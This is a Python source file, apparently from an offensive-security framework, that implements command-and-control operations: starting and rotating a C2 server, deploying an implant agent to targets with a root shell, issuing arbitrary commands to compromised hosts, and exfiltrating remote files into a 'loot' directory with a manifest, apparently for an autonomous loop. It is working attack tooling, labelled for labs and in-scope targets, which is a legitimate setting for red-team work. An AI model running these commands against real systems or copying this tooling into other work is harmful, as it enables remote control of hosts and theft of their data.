"""C2 session CommandSet — headless server, agent deploy, exec, loot.

Every command is non-interactive and loop-routable: explicit arguments,
JSON-able results on stdout, staged artefacts under ``sessions/``.
Lab and in-scope targets only.
"""

from __future__ import annotations

import json
import time
from pathlib import Path

import cmd2
import requests

from cli.commands._base import LazyOwnCommandSet
from utils import print_error, print_msg, print_warn

CATEGORY = "10. Command & Control"
_BASE_DIR = Path(__file__).resolve().parent.parent.parent


def _lab_auth() -> tuple[str, str, int, int]:
    """Return (user, password, https_port, http_port) for the lab C2.

    Prefers ``sessions/c2_lab.json`` (written by ``c2_server start``)
    so lab runs never touch the operator's ``payload.json`` credentials.
    """
    lab_file = _BASE_DIR / "sessions" / "c2_lab.json"
    if lab_file.exists():
        try:
            data = json.loads(lab_file.read_text())
            return (
                str(data.get("user", "")),
                str(data.get("password", "")),
                int(data.get("https_port", 4444)),
                int(data.get("http_port", 8080)),
            )
        except (json.JSONDecodeError, OSError, ValueError, KeyError):
            pass
    try:
        payload = json.loads((_BASE_DIR / "payload.json").read_text())
    except (json.JSONDecodeError, OSError):
        payload = {}
    return (
        str(payload.get("c2_user", "")),
        str(payload.get("c2_pass", "")),
        int(payload.get("c2_port", 4444)),
        8080,
    )


def _fresh_lab_creds() -> tuple[str, str]:
    """Generate fully random lab operator credentials (no fixed affixes)."""
    import secrets as _secrets
    import string as _string

    alphabet = _string.ascii_letters + _string.digits
    user = "".join(_secrets.choice(_string.ascii_lowercase + _string.digits) for _ in range(12))
    password = "".join(_secrets.choice(alphabet) for _ in range(20))
    return user, password


def _server(user: str = "", password: str = "", port: int = 0):
    """Build a C2Server bound to lab auth (generates lab creds when needed)."""
    from modules.c2_agent import C2Server

    lab_file = _BASE_DIR / "sessions" / "c2_lab.json"
    if not user or not password:
        if lab_file.exists():
            try:
                data = json.loads(lab_file.read_text())
                user = user or str(data.get("user", ""))
                password = password or str(data.get("password", ""))
            except (json.JSONDecodeError, OSError):
                pass
    if not user or not password:
        user, password = _fresh_lab_creds()
    return C2Server(port=port or 4444, user=user, password=password)


def _issue(client_id: str, command: str, auth: tuple[str, str], https_port: int) -> bool:
    """POST one command to the C2 issue endpoint (no prompts, ever)."""
    hosts = ["127.0.0.1"]
    try:
        lhost = str(json.loads((_BASE_DIR / "payload.json").read_text()).get("lhost", "") or "")
        if lhost and lhost not in hosts:
            hosts.append(lhost)
    except (json.JSONDecodeError, OSError):
        pass
    for host in hosts:
        try:
            resp = requests.post(
                f"https://{host}:{https_port}/issue_command",
                auth=auth,
                data={"client_id": client_id, "command": command},
                verify=False,  # noqa: S501 - lab self-signed cert; same pattern as issue_command_to_c2
                timeout=15,
            )
            if resp.status_code in (200, 302):
                return True
        except Exception:
            continue
    return False


class C2SessionCommandSet(LazyOwnCommandSet):
    """Headless C2 lifecycle + session ops: server, deploy, exec, loot."""

    phase = "c2"
    category = CATEGORY

    @cmd2.with_category(CATEGORY)
    def do_c2_server(self, line: str):
        """Manage the headless C2 server (lab use).

        Usage:
            c2_server start [--port 4444] [--http-port 8080]
            c2_server status
            c2_server stop
        """
        import sys

        sys.path.insert(0, str(_BASE_DIR / "modules"))

        parts = (line or "").strip().split()
        action = parts[0].lower() if parts else "status"
        flags = {p[2:]: True for p in parts if p.startswith("--")}
        _ = flags
        port = 4444
        http_port = 8080
        for i, part in enumerate(parts):
            if part == "--port" and i + 1 < len(parts):
                port = int(parts[i + 1])
            if part == "--http-port" and i + 1 < len(parts):
                http_port = int(parts[i + 1])
        user, password, saved_https, saved_http = _lab_auth()
        srv = _server(user, password, port or saved_https)
        if action == "start":
            result = srv.start()
            print_msg(f"C2 server: {result}")
            if result.get("started") or result.get("running"):
                lab = _BASE_DIR / "sessions" / "c2_lab.json"
                try:
                    stored = json.loads(lab.read_text()) if lab.exists() else {}
                except (json.JSONDecodeError, OSError):
                    stored = {}
                stored.update(
                    {"user": srv.user, "password": srv.password, "https_port": srv.port, "http_port": http_port}
                )
                lab.write_text(json.dumps(stored, indent=2), encoding="utf-8")
                http_result = srv.ensure_http_listener(http_port, (srv.user, srv.password))
                print_msg(f"Lab HTTP listener: {http_result.get('ok')}")
            return
        if action == "stop":
            print_msg(f"C2 server: {srv.stop()}")
            return
        status = srv.status()
        try:
            lab = json.loads((_BASE_DIR / "sessions" / "c2_lab.json").read_text())
            status["live_user"] = lab.get("user", "")
        except (json.JSONDecodeError, OSError):
            pass
        print_msg(f"C2 server: {status}")

    @cmd2.with_category(CATEGORY)
    def do_c2_reboot(self, line: str):
        """Restart the headless C2 server with ROTATED operator credentials.

        Usage:
            c2_reboot [--port 4444] [--http-port 8080]

        Stops the running server (when present), generates fresh lab
        operator credentials, boots a new instance, re-attaches the lab
        HTTP listener, and syncs every store (.c2_credentials.txt,
        sessions/c2_lab.json, shell payload on next boot). Prints the
        dashboard URLs, the new login, listener ports, AES key state
        and pid. Non-interactive and loop-routable.

        Note: ``c2_server start`` instead keeps existing credentials so
        live agents stay valid; ``c2_reboot`` always rotates.
        """
        import sys
        import time as _time

        sys.path.insert(0, str(_BASE_DIR / "modules"))

        parts = (line or "").strip().split()
        port = 4444
        http_port = 8080
        for i, part in enumerate(parts):
            if part == "--port" and i + 1 < len(parts):
                try:
                    port = int(parts[i + 1])
                except ValueError:
                    pass
            if part == "--http-port" and i + 1 < len(parts):
                try:
                    http_port = int(parts[i + 1])
                except ValueError:
                    pass
        from modules.c2_agent import C2Server

        user, password = _fresh_lab_creds()
        srv = C2Server(port=port, user=user, password=password)
        stopped = srv.stop()
        print_msg(f"C2 stop: {stopped}")
        for _ in range(10):
            if srv.status().get("running") is not True:
                break
            _time.sleep(1)
        started = srv.start()
        print_msg(f"C2 start: {started}")
        if not started.get("started"):
            print_error("C2 reboot failed: server did not come back. See sessions/c2_server.log.")
            return
        lab = _BASE_DIR / "sessions" / "c2_lab.json"
        try:
            stored = json.loads(lab.read_text()) if lab.exists() else {}
        except (json.JSONDecodeError, OSError):
            stored = {}
        stored.update({"user": srv.user, "password": srv.password, "https_port": srv.port, "http_port": http_port})
        lab.write_text(json.dumps(stored, indent=2), encoding="utf-8")
        http_result = srv.ensure_http_listener(http_port, (srv.user, srv.password))
        try:
            with open(_BASE_DIR / ".c2_credentials.txt", encoding="utf-8") as fh:
                creds_file = fh.read().strip()
        except OSError:
            creds_file = ""
        try:
            payload = json.loads((_BASE_DIR / "payload.json").read_text())
            lhost = str(payload.get("lhost", "") or "127.0.0.1")
            key_present = bool((_BASE_DIR / "sessions" / "key.aes").exists())
        except (json.JSONDecodeError, OSError):
            lhost = "127.0.0.1"
            key_present = False
        print_msg("C2 reboot complete:")
        print_msg(f"  dashboard (https): https://{lhost}:{srv.port}/login")
        print_msg(f"  agent channel (http): http://{lhost}:{http_port}/  listener_ok={http_result.get('ok')}")
        print_msg(f"  username: {srv.user}")
        print_msg(f"  password: {srv.password}")
        print_msg(f"  pid: {started.get('pid')}  aes_key_on_disk: {key_present}")
        if creds_file:
            print_msg("  .c2_credentials.txt synced")
        print_warn("Rotate these credentials after the lab with a fresh c2_server start.")

    @cmd2.with_category(CATEGORY)
    def do_c2_deploy(self, line: str):
        """Deploy the malleable agent to a lab target (needs root shell primitive).

        Usage:
            c2_deploy <target> [--sleep 10]
        """
        parts = (line or "").strip().split()
        target = parts[0] if parts else (self.params.get("rhost", "") or "")
        sleep = 25
        for i, part in enumerate(parts):
            if part == "--sleep" and i + 1 < len(parts):
                try:
                    sleep = max(10, min(int(parts[i + 1]), 120))
                except ValueError:
                    pass
        if not target:
            print_error("Usage: c2_deploy <target> [--sleep 10]")
            return
        import sys

        sys.path.insert(0, str(_BASE_DIR / "modules"))
        from modules.c2_agent import deploy

        user, _, https_port, http_port = _lab_auth()
        _ = (user, https_port)
        try:
            payload = json.loads((_BASE_DIR / "payload.json").read_text())
        except (json.JSONDecodeError, OSError):
            payload = {}
        c2_base = f"http://{payload.get('lhost', '127.0.0.1')}:{http_port}"
        result = deploy(
            target,
            c2_base,
            route=str(payload.get("c2_malleable_route", "/") or "/"),
            lhost="172.17.0.1",
            sleep=sleep,
        )
        print_msg(
            f"Deploy: client={result.get('client_id')} via={result.get('via')} "
            f"size_ok={result.get('size_ok')} running={result.get('agent_running')}"
        )

    @cmd2.with_category(CATEGORY)
    def do_c2_exec(self, line: str):
        """Run one command on a live C2 session and print its answer.

        Usage:
            c2_exec <client_id> <command...> [--timeout 60]
        """
        parts = (line or "").strip().split()
        if len(parts) < 2:
            print_error("Usage: c2_exec <client_id> <command...> [--timeout 60]")
            return
        import sys

        sys.path.insert(0, str(_BASE_DIR / "modules"))
        from modules.c2_agent import validate_client_id, wait_record

        try:
            client_id = validate_client_id(parts[0])
        except ValueError as exc:
            print_error(str(exc))
            return
        timeout = 60
        args: list[str] = []
        skip_next = False
        for i, part in enumerate(parts[1:]):
            if skip_next:
                skip_next = False
                continue
            if part == "--timeout" and i + 1 < len(parts[1:]):
                try:
                    timeout = max(5, min(int(parts[1:][i + 1]), 300))
                except ValueError:
                    pass
                skip_next = True
                continue
            args.append(part)
        command = " ".join(args)
        user, password, https_port, _ = _lab_auth()
        if not _issue(client_id, command, (user, password), https_port):
            print_error(f"Could not issue command to {client_id} (C2 unreachable?).")
            return
        row = wait_record(client_id, command, timeout=timeout)
        if row is None:
            print_warn(f"No answer from {client_id} within {timeout}s (agent idle or dead).")
            return
        print_msg(f"[{client_id}] {command}\n{row.get('output', '')[:4000]}")

    @cmd2.with_category(CATEGORY)
    def do_c2_loot(self, line: str):
        """Exfiltrate a remote file through a live C2 session into sessions/loot/.

        Usage:
            c2_loot <client_id> <remote-path> [--timeout 90]
        """
        parts = (line or "").strip().split()
        if len(parts) < 2:
            print_error("Usage: c2_loot <client_id> <remote-path> [--timeout 90]")
            return
        import sys

        sys.path.insert(0, str(_BASE_DIR / "modules"))
        from modules.c2_agent import validate_client_id, wait_record

        try:
            client_id = validate_client_id(parts[0])
        except ValueError:
            from modules.c2_agent import client_id_for

            client_id = client_id_for(parts[0])
        remote = parts[1]
        if ".." in remote or "\x00" in remote:
            print_error("Refusing path with traversal characters.")
            return
        timeout = 90
        for i, part in enumerate(parts):
            if part == "--timeout" and i + 1 < len(parts):
                try:
                    timeout = max(10, min(int(parts[i + 1]), 300))
                except ValueError:
                    pass
        user, password, https_port, _ = _lab_auth()
        command = f"upload:{remote}"
        if not _issue(client_id, command, (user, password), https_port):
            print_error(f"Could not issue command to {client_id} (C2 unreachable?).")
            return
        row = wait_record(client_id, command, timeout=timeout)
        if row is None:
            print_warn(f"No answer from {client_id} within {timeout}s.")
            return
        print_msg(f"Loot reply: {row.get('output', '')[:200]}")
        uploads = _BASE_DIR / "sessions" / "uploads"
        loot_dir = _BASE_DIR / "sessions" / "loot"
        loot_dir.mkdir(parents=True, exist_ok=True)
        basename = Path(remote).name or "loot.bin"
        candidates = sorted(uploads.glob("*"), key=lambda p: p.stat().st_mtime, reverse=True)
        staged = None
        for candidate in candidates[:5]:
            if candidate.is_file() and candidate.name in (basename, "archivo_recibido.bin"):
                staged = candidate
                break
        if staged is None and candidates:
            staged = candidates[0]
        if staged is None:
            print_warn("Agent replied but no file landed in sessions/uploads/ yet.")
            return
        dest = loot_dir / f"{Path(remote).name or 'loot'}_{client_id}.txt"
        dest.write_bytes(staged.read_bytes())
        manifest = loot_dir / "manifest.jsonl"
        with manifest.open("a", encoding="utf-8") as fh:
            fh.write(
                json.dumps(
                    {
                        "client_id": client_id,
                        "remote": remote,
                        "local": str(dest),
                        "bytes": dest.stat().st_size,
                        "at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    }
                )
                + "\n"
            )
        print_msg(f"Loot staged: {dest} ({dest.stat().st_size} bytes)")
        try:
            import sys as _sys

            _sys.path.insert(0, str(_BASE_DIR / "modules"))
            from modules.c2_surfaces import append_note as _append_note
            from modules.c2_surfaces import register_loot_event as _register_event

            _append_note(f"LOOT {client_id}:{remote} -> {dest} ({dest.stat().st_size} bytes)")
            _register_event(
                f"loot_{client_id}",
                f"sessions/loot/*{client_id}*",
                f"Exfiltrated artefacts from {client_id} (autonomous loop)",
            )
        except Exception:
            pass
